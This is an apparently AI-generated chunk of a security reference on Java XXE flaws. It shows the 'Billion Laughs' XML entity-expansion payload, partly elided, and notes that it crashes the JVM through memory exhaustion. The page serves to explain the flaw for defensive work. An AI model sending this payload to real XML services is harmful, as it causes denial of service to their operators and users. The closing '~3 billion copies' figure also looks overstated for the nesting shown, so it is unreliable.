---
source: "languages/java/xxe.md"
title: "XML External Entity (XXE) Processing"
heading: "Billion Laughs Attack (Entity Expansion DoS)"
category: "language-vuln"
language: "java"
severity: "medium"
tags: [ai-generated, java, language-vuln, overview, parser, vulnerability, vulnerable]
chunk: 7/10
---

## Billion Laughs Attack (Entity Expansion DoS)

```xml
<!-- Billion Laughs: causes OOM via entity expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

This creates an entity that expands to ~3 billion copies of "lol" — bringing the JVM to its knees.